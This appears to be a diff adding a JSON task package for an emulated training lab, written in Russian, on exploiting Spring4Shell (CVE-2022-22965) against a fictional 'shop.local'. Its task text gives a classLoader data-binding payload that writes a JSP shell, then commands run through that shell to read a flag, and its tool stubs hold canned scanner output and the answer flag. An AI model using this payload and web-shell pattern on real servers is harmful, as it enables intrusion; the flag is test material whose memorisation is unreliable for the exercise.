@@ -1,0 +1,37 @@
+{
+  "id": "web-framework-cves",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{spring4sh3ll_cv3_2022_22965}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Spring4Shell (CVE-2022-22965)\n\n`shop.local` — Spring Boot на Tomcat (виден `JSESSIONID`). Определи точную\nверсию, затем эксплуатируй data-binding до записи JSP-шелла.\n\n1. Определи стек и версию:\n\n   curl -s -I https://shop.local/\n   curl -s https://shop.local/actuator/info\n\n2. Отправь Spring4Shell-payload (пишет shell.jsp в webapps/ROOT):\n\n   curl -s 'https://shop.local/' -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di'\n\n3. Выполни команду через шелл и прочитай флаг:\n\n   curl -s 'https://shop.local/shell.jsp?cmd=id'\n   curl -s 'https://shop.local/shell.jsp?cmd=cat /flag.txt' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "shell\\.jsp.*flag|flag\\.txt.*shell\\.jsp", "example": "-s 'https://shop.local/shell.jsp?cmd=cat /flag.txt'", "output": "nto{spring4sh3ll_cv3_2022_22965}\n" },
+        { "match": "shell\\.jsp", "example": "-s 'https://shop.local/shell.jsp?cmd=id'", "output": "uid=0(root) gid=0(root) groups=0(root)\n" },
+        { "match": "class\\.module\\.classLoader", "example": "-s 'https://shop.local/' -d 'class.module.classLoader...pattern=...'", "output": "HTTP/1.1 200 OK\nContent-Type: text/html\n\nOK\n" },
+        { "match": "actuator/info", "example": "-s https://shop.local/actuator/info", "output": "{\"app\":{\"name\":\"shop\",\"spring-boot\":\"2.6.3\"}}\n" },
+        { "match": "-sI|shop\\.local/ ", "example": "-sI https://shop.local/", "output": "HTTP/1.1 200 OK\nServer: nginx\nX-Application-Context: application:prod:8080\nSet-Cookie: JSESSIONID=8A3F...; Path=/; HttpOnly\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только Spring-фасад shop.local.\n"
+    },
+    "searchsploit": {
+      "help": "searchsploit <термин> — поиск PoC (эмуляция)",
+      "cases": [
+        { "match": "spring", "example": "spring 2.6", "output": "Spring Framework - ClassLoader Manipulation (CVE-2022-22965) | multiple/webapps/50900.py\nSpring Boot Actuator - Env Disclosure            | multiple/webapps/49960.txt\n" }
+      ],
+      "fallback": "searchsploit: в этой лабе эмулируется поиск по 'spring'.\n"
+    },
+    "nuclei": {
+      "help": "nuclei -u <url> [-tags ...] — сканер CVE (эмуляция shop.local)",
+      "cases": [
+        { "match": "shop\\.local", "example": "-u https://shop.local -tags spring,cve", "output": "[CVE-2022-22965] [http] [critical] https://shop.local/ [spring4shell]\n[springboot-actuator] [http] [medium] https://shop.local/actuator/info\n" }
+      ],
+      "fallback": "nuclei: в этой лабе эмулируется скан shop.local.\n"
+    }
+  }
+}
